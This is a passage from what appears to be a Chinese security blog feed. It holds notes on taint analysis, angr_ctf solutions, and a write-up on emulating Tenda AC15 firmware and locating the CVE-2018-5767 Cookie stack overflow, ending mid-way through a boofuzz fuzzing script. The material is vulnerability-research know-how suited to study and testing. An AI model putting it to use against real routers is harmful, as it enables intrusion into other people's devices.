class="line">    y = 1;</span><br><span class="line">else</span><br><span class="line">    y = 0;</span><br></pre></td></tr></table></figure><h2 id="静态污点分析"><a href="#静态污点分析" class="headerlink" title="静态污点分析"></a>静态污点分析</h2><p>静态污点分析系统首先对程序代码进行解析，获得程序代码的中间表示，然后在中间表示的基础上对程序代码进行控制流分析等辅助分析，以获得需要的控制流图、调用图等。在辅助分析的过程中，系统可以利用污点分析规则在中间表示上识别程序中的 Source 点和 Sink 点。最后检测系统根据污点分析规则，利用静态污点分析检查程序是否存在污点类型的漏洞。</p><p>基于数据流的污点分析。在<strong>不考虑隐式信息流</strong>的情况下，可以将污点分析看做针对污点数据的数据流分析。根据污点传播规则<strong>跟踪污点信息</strong>或者<strong>标记路径上的变量污染情况</strong>，进而检查污点信息是否影响敏感操作。</p><p>基于依赖关系的污点分析。考虑隐式信息流，在分析过程中，根据程序中的语句或者指令之间的依赖关系，<strong>检查 Sink 点处敏感操作是否依赖于 Source 点处接收污点信息的操作</strong>。</p><h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p>动态污点分析是在<strong>程序运行</strong>的基础上，对数据流或控制流进行监控，从而实现对数据在内存中的显式传播、数据误用等进行跟踪和检测。动态污点分析与静态污点分析的唯一区别在于<strong>静态污点分析技术在检测时并不真正运行程序</strong>，而是通过模拟程序的执行过程来传播污点标记，而动态污点分析技术需要运行程序，同时实时传播并检测污点标记。识别出污点数据后，需要对污点进行标记。<strong>污点生命周期</strong>是指在该生命周期的时间范围内，污点被定义为有效。污点生命周期开始于污点创建时刻，生成污点标记，结束于污点删除时刻，清除污点标记。</p><h1 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h1><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015095508733.png" alt="image-20211015095508733"></p><ul><li><p>CLE（CLE Load Everything）：可执行文件和库的加载器</p><p>负责装载二进制对象以及它所依赖的库，将自身无法执行的操作转移给angr的其它组件，最后生成地址空间，表示该程序已加载并可以准备运行。</p></li><li><p>archinfo：描述各种架构的库</p></li><li><p>PyVEX：关于二进制代码转换VEX的python包装器</p><p>angr需要处理不同的架构，所以它选择一种中间语言来进行它的分析，angr使用Valgrind的中间语言——VEX来完成这方面的内容。VEX中间语言抽象了几种不同架构间的区别，允许在他们之上进行统一的分析。</p></li><li><p>SimuVEX：中间语言VEX执行的模拟器</p><p>它允许你控制符号执行</p></li><li><p>Claripy：抽象的约束求解包装器</p><p>专注于将变量符号化，生成约束式并求解约束式，符号执行的核心所在。</p></li><li><p>Angr：程序分析套件</p></li><li><p>以上：上层封装好的接口</p></li></ul><h2 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr_ctf"></a>angr_ctf</h2><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015142359703.png" alt="image-20211015142359703"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [1]: import angr</span><br><span class="line"></span><br><span class="line">In [2]: p = angr.Project(&quot;./00_angr_find&quot;)# 打开要执行的二进制文件</span><br><span class="line"></span><br><span class="line">In [3]: init_state = p.factory.entry_state()# 创建空白的执行上下文环境</span><br><span class="line"></span><br><span class="line">In [4]: smg = p.factory.simulation_manager(init_state)# 创建模拟器</span><br><span class="line"></span><br><span class="line">In [5]: smg.explore(find=0x8048675)# 探索到目标地址</span><br><span class="line">WARNING | 2021-10-15 05:06:35,829 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING | 2021-10-15 05:06:35,830 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80486b1 (__libc_csu_init+0x1 in 00_angr_find (0x80486b1))</span><br><span class="line">WARNING | 2021-10-15 05:06:35,832 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x80486b3 (__libc_csu_init+0x3 in 00_angr_find (0x80486b3))</span><br><span class="line">WARNING | 2021-10-15 05:06:38,184 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x818ac20 (strcmp+0x0 in libc.so.6 (0x8ac20))</span><br><span class="line">Out[5]: &lt;SimulationManager with 1 active, 16 deadended, 1 found&gt;# 找到一个结果</span><br><span class="line"></span><br><span class="line">In [6]: found_state = smg.found[0]</span><br><span class="line"></span><br><span class="line">In [7]: found_state.posix.dumps(0)</span><br><span class="line">Out[7]: b&apos;JXWVXRKX&apos;</span><br></pre></td></tr></table></figure><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p><code>Options -&gt; General -&gt; Line prefixes(graph) 调出Graph框地址</code></p><p>目标</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015150619082.png" alt="image-20211015150619082"></p><p>同时为了节省算时，我们不想到达avoid_me处</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015150557340.png" alt="image-20211015150557340"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In [2]: import angr</span><br><span class="line"></span><br><span class="line">In [3]: p = angr.Project(&quot;./01_angr_avoid&quot;)</span><br><span class="line"></span><br><span class="line">In [4]: init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">In [5]: smg = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line">In [6]: smg.explore(find=0x080485E0, avoid=0x080485A8)# find目标地址 avoid排除地址</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING | 2021-10-15 07:04:50,906 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80d4591 (__libc_csu_init+0x1 in 01_angr_avoid (0x80d4591))</span><br><span class="line">WARNING | 2021-10-15 07:04:50,908 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x80d4593 (__libc_csu_init+0x3 in 01_angr_avoid (0x80d4593))</span><br><span class="line">WARNING | 2021-10-15 07:04:55,068 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff3d with 11 unconstrained bytes referenced from 0x818b210 (strncmp+0x0 in libc.so.6 (0x8b210))</span><br><span class="line">WARNING | 2021-10-15 07:04:55,068 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x818b210 (strncmp+0x0 in libc.so.6 (0x8b210))</span><br><span class="line">Out[6]: &lt;SimulationManager with 1 active, 16 deadended, 1 found, 8 avoid&gt;</span><br><span class="line"></span><br><span class="line">In [7]: found_state = smg.found[0]</span><br><span class="line"></span><br><span class="line">In [8]: found_state.posix.dumps(0)</span><br><span class="line">Out[8]: b&apos;HUJOZMYS&apos;</span><br></pre></td></tr></table></figure><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>目标</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211015150619082.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">    p = angr.Project(&quot;./02_angr_find_condition&quot;)</span><br><span class="line">    init_state = p.factory.entry_state()</span><br><span class="line">    sim = p.factory.simgr(init_state)</span><br><span class="line">    </span><br><span class="line">    sim.explore(find=0x0804900D)</span><br><span class="line">    </span><br><span class="line">    if sim.found:</span><br><span class="line">        found_state = sim.found[0]</span><br><span class="line">        print(found_state.posix.dumps(0))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&apos;Could not find the solution!&apos;)</span><br><span class="line">    </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><blockquote><p>Reference:</p><p><a href="http://www.jsjkx.com/CN/article/openArticlePDF.jsp?id=224" target="_blank" rel="noopener">符号执行研究综述</a></p><p><a href="https://bbs.pediy.com/thread-264775.htm" target="_blank" rel="noopener">angr学习(angr_ctf)</a></p><p><a href="https://www.bookstack.cn/" target="_blank" rel="noopener">ctf all in one 5.1&amp;5.5</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;符号执行&quot;&gt;&lt;a href=&quot;#符号执行&quot; class=&quot;headerlink&quot; title=&quot;符号执行&quot;&gt;&lt;/a&gt;符号执行&lt;/h1&gt;&lt;p&gt;给一个结果，求输入。&lt;/p&gt;
&lt;p&gt;根据发展状况,可以将符号执行分为经典符号执行、动态符号执行和选择性符号执行&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="笔记" scheme="p1Kk.github.io/categories/笔记/"/>
    
    
    <category term="待完善" scheme="p1Kk.github.io/tags/待完善/"/>
    
  </entry>
  
  <entry>
    <title>以Tenda AC15 CVE-2018-5767为例进行fuzz测试</title>
    <link href="p1Kk.github.io/2021/03/29/iot/Tenda%20AC15%20CVE-2018-5767%20CVE-2020-10987/"/>
    <id>p1Kk.github.io/2021/03/29/iot/Tenda%20AC15%20CVE-2018-5767%20CVE-2020-10987/</id>
    <published>2021-03-28T16:00:00.000Z</published>
    <updated>2021-05-08T10:58:58.668Z</updated>
    
    <content type="html"><![CDATA[<p>影响产品：Tenda AC15路由器</p><p>影响版本：5767：V15.03.05.16 &amp; 10987：V15.03.05.18</p><p>固件下载链接（V15.03.05.16）：<a href="https://down.tendacn.com/uploadfile/201401/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar" target="_blank" rel="noopener">https://down.tendacn.com/uploadfile/201401/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar</a></p><h1 id="关于fuzz"><a href="#关于fuzz" class="headerlink" title="关于fuzz"></a>关于fuzz</h1><p>Fuzzing引擎算法中，测试用例的生成方式主要有2种：</p><p>1）基于变异：根据已知数据样本通过变异的方法生成新的测试用例；</p><p>2）基于生成：根据已知的协议或接口规范进行建模，生成测试用例；</p><p>一般Fuzzing工具中，都会综合使用这两种生成方式。</p><p>基于变异的算法核心要求是学习已有的数据模型，基于已有数据及对数据的分析，再生成随机数据做为测试用例。</p><ul><li>而Boofuzz是Sulley的继承者，属于基于<strong>生成</strong>的<strong>黑盒</strong>模糊测试</li></ul><h2 id="Boofuzz安装-ubuntu20"><a href="#Boofuzz安装-ubuntu20" class="headerlink" title="Boofuzz安装(ubuntu20)"></a>Boofuzz安装(ubuntu20)</h2><p>github：<a href="https://github.com/jtpereyda/boofuzz" target="_blank" rel="noopener">https://github.com/jtpereyda/boofuzz</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-pip python3-venv build-essential</span><br><span class="line">$ mkdir boofuzz &amp;&amp; cd boofuzz</span><br><span class="line">$ python3 -m venv env</span><br><span class="line">$ source env/bin/activate</span><br><span class="line">(env) $ pip install -U pip setuptools</span><br><span class="line">(env) $ pip install boofuzz</span><br><span class="line">$ alias python_boofuzz=&apos;[env_path]/bin/python&apos;</span><br></pre></td></tr></table></figure><p>官方文档：<a href="https://boofuzz.readthedocs.io/en/stable/" target="_blank" rel="noopener">https://boofuzz.readthedocs.io/en/stable/</a></p><h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><p>固件解包不多说了</p><h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user-mod"></a>user-mod</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-arm-static) ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./bin/httpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 😁可以直接模拟起来</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果要用gdb调试</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd</span></span><br></pre></td></tr></table></figure><p>但是程序并没有任何动静，所以我们定位到<code>WeLoveLinux</code>字符串所在的函数<code>sub_2CEA8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ..."</span>);</span><br><span class="line">sub_2F04C();</span><br><span class="line"><span class="keyword">while</span> ( check_network(v17) &lt;= <span class="number">0</span> )<span class="comment">// 如果验证不通过，就会循环sleep，卡死</span></span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">v1 = sleep(<span class="number">1u</span>);</span><br><span class="line"><span class="keyword">if</span> ( ConnectCfm(v1) )</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// ConnectCfm不通过，也会报错退出</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"connect cfm failed!"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v2;</span><br></pre></td></tr></table></figure><p>所以就考虑patch修改一下，将R0都修改为1即可绕过</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/AC15httpdPatch.png" alt></p><p>借助<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r3%2C+1&arch=arm&as_format=inline#assembly" target="_blank" rel="noopener">在线汇编反汇编网站</a>进行patch（或者使用keypatch）：</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15Patched.png" alt></p><p>替换文件后模拟运行，发现监听的IP地址不是我虚拟机网卡地址。（关于这个connect的报错字符，并没有在文件中找到，暂且不管了</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15usermodWrong2.png" alt></p><p>再次定位到报错字符串位置，看看这个奇怪的ip是怎么来的</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15ipString.png" alt></p><p>往上找到a1</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15lan_ipXref.png" alt></p><p>定位到a1的由来</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15foundlan_ip.png" alt></p><p>再次查找该全局变量的引用，并寻找赋值语句。</p><p><code>GetValue</code>函数获取<code>lan.ip</code>，即为<code>g_lan_ip</code>，但是还是不知道这个函数是怎么运作的…</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15lan_ip.png" alt></p><p>参考文章指出这个函数往上的<code>check_network</code>是一个外部函数，定义在<code>libcommon.so</code>中（这是怎么知道的？ 在其中能找到<code>check_network-&gt;getLanIfName()-&gt;get_eth_name(0)-&gt;br0</code>），所以我们可以自己新建一个虚拟网卡<code>br0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t br0 -u `whoami`</span><br><span class="line">$ sudo ifconfig br0 192.168.65.1/24</span><br></pre></td></tr></table></figure><p>再次运行就成功~</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>两个漏洞都位于<code>bin/httpd</code>文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./bin/httpd </span></span><br><span class="line">./bin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec ./bin/httpd</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>从该文件中找到的函数可以看出是<a href="https://xz.aliyun.com/t/2835" target="_blank" rel="noopener">基于GoAhead</a></p><p>CVE-2018-5767漏洞在<code>R7WebsSecurityHandler</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15stackoverflow.png" alt></p><p><code>strstr()</code>匹配到<code>password=</code>处，并使用<code>sscanf()</code>，通过正则表达式，匹配<code>password</code>的值读到<code>v34</code>。</p><blockquote><p>sscanf()函数用于从字符串中读取指定格式的数据，其原型如下：<br>  int sscanf (char *str, char * format [, argument, …]);</p><p>【参数】参数str为要读取数据的字符串；format为用户指定的格式；argument为变量，用来保存读取到的数据。</p><p>【返回值】成功则返回参数数目，失败则返回-1，错误原因存于errno 中。</p><p>sscanf()会将参数str 的字符串根据参数format（格式化字符串）来转换并格式化数据（格式化字符串请参考scanf()）， 转换后的结果存于对应的变量中。</p><p>sscanf()与scanf()类似，都是用于输入的，只是scanf()以键盘(stdin)为输入源，sscanf()以固定字符串为输入源。</p></blockquote><p>理了半天这个正则表达式 不如写一个测试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> result[<span class="number">100</span>] = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"username=111;passwd=123;whoami=root"</span>;</span><br><span class="line"><span class="keyword">char</span> *p;</span><br><span class="line">p = <span class="built_in">strstr</span>(s, <span class="string">"passwd="</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"After strstr() -------------&gt; %s\n"</span>, p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(p, <span class="string">"%*[^=]=%[^;];*"</span>, result);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"After regular expression ---&gt; %s\n"</span>, result);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./<span class="built_in">test</span> </span></span><br><span class="line">After strstr() -------------&gt; passwd=123;whoami=root</span><br><span class="line">After regular expression ---&gt; 123</span><br></pre></td></tr></table></figure><p>而这里没有对<code>v41</code>的长度进行检测，如果<code>password</code>被我们伪造的过长，就会产生栈溢出。</p><p>IDA中导入结构体<code>View–&gt;Open Subviews–&gt;Local Types 中可以看到本地已有的结构体，右击 insert.可以添加 C 语言声明的结构体</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">struct websRec &#123;</span><br><span class="line">    ringq_t         header;             /* Header dynamic string */</span><br><span class="line">    __time_t            since;              /* Parsed if-modified-since time */</span><br><span class="line">    char*       cgiVars;            /* CGI standard variables */</span><br><span class="line">    char*       cgiQuery;           /* CGI decoded query string */</span><br><span class="line">    __time_t            timestamp;          /* Last transaction with browser */</span><br><span class="line">    int             timeout;            /* Timeout handle */</span><br><span class="line">    char            ipaddr[32];         /* Connecting ipaddress */</span><br><span class="line">    char            type[64];           /* Mime type */</span><br><span class="line">    char            *dir;               /* Directory containing the page */</span><br><span class="line">    char            *path;              /* Path name without query */</span><br><span class="line">    char            *url;               /* Full request url */</span><br><span class="line">    char            *host;              /* Requested host */</span><br><span class="line">    char            *lpath;             /* Cache local path name */</span><br><span class="line">    char            *query;             /* Request query */</span><br><span class="line">    char            *decodedQuery;      /* Decoded request query */</span><br><span class="line">    char            *authType;          /* Authorization type (Basic/DAA) */</span><br><span class="line">    char            *password;          /* Authorization password */</span><br><span class="line">    char            *userName;          /* Authorization username */</span><br><span class="line">    char            *cookie;            /* Cookie string */</span><br><span class="line">    char            *userAgent;         /* User agent (browser) */</span><br><span class="line">    char            *protocol;          /* Protocol (normally HTTP) */</span><br><span class="line">    char            *protoVersion;      /* Protocol version */</span><br><span class="line">    int             sid;                /* Socket id (handler) */</span><br><span class="line">    int             listenSid;          /* Listen Socket id */</span><br><span class="line">    int             port;               /* Request port number */</span><br><span class="line">    int             state;              /* Current state */</span><br><span class="line">    int             flags;              /* Current flags -- see above */</span><br><span class="line">    int             code;               /* Request result code */</span><br><span class="line">    int             clen;               /* Content length */</span><br><span class="line">    int             wid;                /* Index into webs */</span><br><span class="line">    char            *cgiStdin;          /* filename for CGI stdin */</span><br><span class="line">    int             docfd;              /* Document file descriptor */</span><br><span class="line">    int             numbytes;           /* Bytes to transfer to browser */</span><br><span class="line">    int             written;            /* Bytes actually transferred */</span><br><span class="line">    void            (*writeSocket)(struct websRec *wp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>v41</code>修改为<code>websRec</code>结构体（<code>右键 -&gt; Convert to struct*...</code>）</p><p>可以看出，获取的是Cookie字段的值</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>使用boo-fuzz框架，</p><p>测试溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"># fuzz.py</span><br><span class="line">from boofuzz import *</span><br><span class="line"></span><br><span class="line">IP = &quot;192.168.65.1&quot;</span><br><span class="line">PORT = 80</span><br><span class="line"></span><br><span class="line">def check_response(target, fuzz_data_logger, session, *args, **kwargs):</span><br><span class="line">    fuzz_data_logger.log_info(&quot;Checking test case response...&quot;)</span><br><span class="line">    try:</span><br><span class="line">        response = target.recv(512)</span><br><span class="line">    except:</span><br><span class="line">        fuzz_data_logger.log_fail(&quot;Unable to connect to target. Closing...&quot;)</span><br><span class="line">        target.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    #if empty response</span><br><span class="line">    if not response:</span><br><span class="line">        fuzz_data_logger.log_fail(&quot;Empty response, target may be hung. Closing...&quot;)</span><br><span class="line">        target.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    #remove everything after null terminator, and convert to string</span><br><span class="line">    #response = 